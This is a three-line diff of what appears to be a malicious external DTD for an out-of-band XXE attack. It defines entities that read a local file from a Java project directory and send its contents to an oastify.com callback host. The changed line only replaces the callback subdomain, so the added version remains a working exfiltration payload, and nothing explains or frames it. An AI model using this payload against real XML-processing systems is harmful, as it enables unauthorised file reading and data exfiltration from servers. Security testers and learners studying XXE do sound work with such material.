@@ -1,3 +1,3 @@
 <!ENTITY % file SYSTEM "file:///C:/Users/Admin/IdeaProjects/Lohong2/src/main/java/com/example/lohong2/test.txt">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://mzpqugeil8fhlkwn16ds8nm2xt3krafz.oastify.com/aaa?%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://fo7x2wjdj01bm0aoeb3tr07uhlncb2zr.oastify.com/aaa?%file;'>">
 %all;
